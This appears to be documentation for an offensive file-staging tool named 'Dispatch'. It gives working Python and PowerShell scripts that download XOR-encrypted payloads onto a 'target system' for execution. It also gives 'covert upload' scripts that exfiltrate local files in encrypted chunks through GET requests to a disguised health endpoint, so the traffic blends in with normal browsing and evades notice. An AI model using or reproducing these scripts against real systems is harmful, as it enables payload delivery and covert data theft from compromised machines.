Decryption Methods

⚠️ Using the built-in file encryption feature?
The following code snippets can be used to decrypt downloaded files on the target system before execution.

Python Download + Decrypt
#!/usr/bin/env python3
import argparse
import requests

def dispatch_decrypt(data, key):
    key_bytes = key.encode("utf-8")
    out = bytearray(len(data))
    for i, b in enumerate(data):
        out[i] = b ^ key_bytes[i % len(key_bytes)]
    return bytes(out)

def main():
    parser = argparse.ArgumentParser(description="Download and decrypt a Dispatch-encrypted file.")
    parser.add_argument("url", help="Dispatch file URL")
    parser.add_argument("key", help="Dispatch decryption key")
    parser.add_argument("output", help="Output file path")
    args = parser.parse_args()

    response = requests.get(args.url, verify=False, timeout=30)
    response.raise_for_status()

    decrypted = dispatch_decrypt(response.content, args.key)
    with open(args.output, "wb") as f:
        f.write(decrypted)

if __name__ == "__main__":
    main()
PowerShell Download + Decrypt

$wc = New-Object System.Net.WebClient
$data = $wc.DownloadData($Url)

if ($Key.Length -eq 0) {
    throw "Decryption key cannot be empty."
}

$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
$result = New-Object byte[] $data.Length
for ($i = 0; $i -lt $data.Length; $i++) {
    $result[$i] = $data[$i] -bxor $keyBytes[$i % $keyBytes.Length]
}

[System.IO.File]::WriteAllBytes($Output, $result)

Covert Upload

Use the code below to perform file upload using Dispatch's covert API endpoint. This method breaks files into XOR encrypted chunks before upload via HTTP [GET] requests - blending in with standard browsing activity. Data is then tracked and reassembled server-side.

Python Covert Upload
#!/usr/bin/env python3
import argparse
import base64
import os
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def xor_bytes(data, key_bytes):
    out = bytearray(len(data))
    for i, b in enumerate(data):
        out[i] = b ^ key_bytes[i % len(key_bytes)]
    return bytes(out)

def main():
    p = argparse.ArgumentParser(description="Covert upload to Dispatch /api/v1/health")
    p.add_argument("base_url", help="Example: https://127.0.0.1:443")
    p.add_argument("local_file", help="Path to local file to upload")
    p.add_argument("--remote-name", default=None, help="Optional remote filename")
    p.add_argument("--api-key", default=None, help="Optional X-Dispatch-Auth header")
    p.add_argument("--chunk-size", type=int, default=768, help="Bytes per chunk")
    args = p.parse_args()

    endpoint = args.base_url.rstrip("/") + "/api/v1/health"
    remote_name = args.remote_name or os.path.basename(args.local_file)
    headers = {"X-Dispatch-Auth": args.api_key} if args.api_key else {}

    s = requests.Session()
    r = s.get(endpoint, params={"init": "1", "filename": remote_name}, headers=headers, verify=False, timeout=30)
    r.raise_for_status()

    key = s.cookies.get("csrf")
    if not key:
        raise RuntimeError("Upload key cookie (csrf) not returned by server.")
    key_bytes = key.encode("utf-8")

    with open(args.local_file, "rb") as f:
        while True:
            chunk = f.read(args.chunk_size)
            if not chunk:
                break
            enc = xor_bytes(chunk, key_bytes)
            b64 = base64.b64encode(enc).decode("ascii")
            rr = s.get(endpoint, params={"data": b64}, headers=headers, verify=False, timeout=30)
            rr.raise_for_status()

    eof_enc = xor_bytes(b"<EOF>", key_bytes)
    eof_b64 = base64.b64encode(eof_enc).decode("ascii")
    rr = s.get(endpoint, params={"data": eof_b64}, headers=headers, verify=False, timeout=30)
    rr.raise_for_status()
    print("Upload complete:", rr.text)

if __name__ == "__main__":
    main()
PowerShell Covert Upload
param(
    [Parameter(Mandatory=$true)][string]$BaseUrl,
    [Parameter(Mandatory=$true)][string]$LocalFile,
    [string]$RemoteName = "",
    [string]$ApiKey = "",
    [int]$ChunkSize = 768
)

[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'

if (-not (Test-Path $LocalFile)) { throw "Local file not found: $LocalFile" }
if ([string]::IsNullOrWhiteSpace($RemoteName)) { $RemoteName = [System.IO.Path]::GetFileName($LocalFile) }

$endpoint = $BaseUrl.TrimEnd("/") + "/api/v1/health"
$wc = New-Object System.Net.WebClient
if (-not [string]::IsNullOrWhiteSpace($ApiKey)) { $wc.Headers.Add("X-Dispatch-Auth", $ApiKey) }

$null = $wc.DownloadString("$endpoint?init=1&filename=$([uri]::EscapeDataString($RemoteName))")
$keyCookie = ($wc.ResponseHeaders["Set-Cookie"] -split ";|,") | Where-Object { $_ -match "^\s*csrf=" } | Select-Object -First 1
if (-not $keyCookie) { throw "Upload key cookie (csrf) not returned by server." }
$key = ($keyCookie -replace "^\s*csrf=", "").Trim()
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)

function Xor-Bytes([byte[]]$data, [byte[]]$keyBytes) {
    $out = New-Object byte[] $data.Length
    for ($i = 0; $i -lt $data.Length; $i++) { $out[$i] = $data[$i] -bxor $keyBytes[$i % $keyBytes.Length] }
    return $out
}

$fs = [System.IO.File]::OpenRead($LocalFile)
try {
    $buffer = New-Object byte[] $ChunkSize
    while (($read = $fs.Read($buffer, 0, $buffer.Length)) -gt 0) {
        $chunk = if ($read -eq $buffer.Length) { $buffer } else { $buffer[0..($read-1)] }
        $enc = Xor-Bytes $chunk $keyBytes
        $b64 = [System.Convert]::ToBase64String($enc)
        $null = $wc.DownloadString("$endpoint?data=$([uri]::EscapeDataString($b64))")
    }
}
finally { $fs.Close() }

$eof = [System.Text.Encoding]::ASCII.GetBytes("<EOF>")
$eofEnc = Xor-Bytes $eof $keyBytes
$eofB64 = [System.Convert]::ToBase64String($eofEnc)
$result = $wc.DownloadString("$endpoint?data=$([uri]::EscapeDataString($eofB64))")
Write-Output "Upload complete: $result"
